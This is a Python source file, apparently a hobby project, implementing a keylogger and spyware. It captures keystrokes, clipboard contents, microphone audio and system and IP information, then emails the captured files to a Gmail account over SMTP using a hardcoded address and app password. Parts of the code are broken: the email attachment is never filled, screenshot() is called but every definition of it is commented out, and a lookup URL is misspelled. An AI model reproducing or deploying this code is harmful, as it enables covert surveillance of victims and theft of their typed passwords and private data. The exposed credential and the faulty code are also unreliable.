# Libraries 

from email.mime.multipart import MIMEMultipart      
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Libs to collect  computer information
import socket
import platform

# clipboard libs
import pyperclip  # Replaced win32clipboard # Cross-platform Clipboard lib

# keystrokes lib
from pynput.keyboard import Key, Listener

# system info to track time
import time
import os

# microphone libs
from scipy.io.wavfile import write
import sounddevice as sd

# encrypt files lib
from cryptography.fernet import Fernet

import getpass
from requests import get 

# screenshot lib 
from multiprocessing import Process, freeze_support
import pyautogui

## KeyLogger

keys_information = "new_key_log.txt"
system_information = "sys_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

microphone_time = 10
time_iterations = 15
number_of_iterations_end = 3

email_address = "vblueice1@gmail.com"
password = "lkck bqnt louf vgyi"
toaddress = "vblueice1@gmail.com"

file_path = "/home/vblueice/BlueIce/Python-keylogger/project" 
extend = "/"

def send_email(filename, attachment, toaddress):

    fromaddress = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddress

    msg['To'] = toaddress

    msg['Subject'] = "Key_Log_File"

    body = "Body_of_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')


    p = MIMEBase('application', 'octet-stream')
    p.add_header('Content-Disposition', "attachment: filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls() 

    s.login(fromaddress, password)

    text = msg.as_string()

    s.sendmail(fromaddress, toaddress, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddress)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try: 
            public_ip = get("http://api.ipiiify.org").text
            f.write("Public IP Address" + public_ip)
        
        except Exception: 
            f.write("Couldnt get Public IP Address (max queries reached)\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# For Windows based machines 
#
# def copy_clipboard():
#     with open(file_path + extend + clipboard_information, "a") as f: 
#         try:
#             win32clipboard.OpenClipboard()
#             pasted_data = win32clipboard.GetClipboardData()
#             win32clipboard.CloseClipboard()

#             f.write("Clipboard Data: \n" + pasted_data)

#         except: 
#             f.write("Clipboard could not be copied")
    
# copy_clipboard()

# For Cross-platform 
def copy_clipboard():

    with open(file_path + extend + clipboard_information, "a") as f: 
        try:
            
            pasted_data = pyperclip.paste()

            f.write("Clipboard Data: \n" + pasted_data + "\n")

        except Exception as e: 
            f.write("Clipboard could not be copied. Error: " + str(e) + "\n")
    
copy_clipboard()

def microphone():
    fz = 44100
    seconds = microphone_time

    my_recording = sd.rec(int(seconds * fz), samplerate=fz, channels=2, dtype='int16') 
    sd.wait()
    write(file_path + extend + audio_information, fz, my_recording)

microphone()

# def screenshot():
#     im = ImageGrab.grab()
#     im.save(file_path + extend + screenshot_information)

# screenshot()

# def screenshot():
#     with mss.mss() as sct: 
#         sct.shot(output=file_path+extend+screenshot_information)
    
# screenshot()

# def capture_screenshot():
#     screenshot = pyautogui.screenshot()
#     screenshot.save(file_path+extend)

# capture_screenshot()

# def screenshot():
#     subprocess.run(["scrot", file_path+extend+screenshot_information], check=True)

# screenshot()

number_of_iterations = 0 
currentTime = time.time()
stoppingTime = time.time() + time_iterations


while number_of_iterations < number_of_iterations_end: 


    count = 0 
    keys = []

    def on_press(key):

        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >=1:
            count = 0
            write_file(keys)
            keys = []



    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime: 
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path+extend+keys_information, "w") as f:
            f.write("")
        
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddress)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iterations

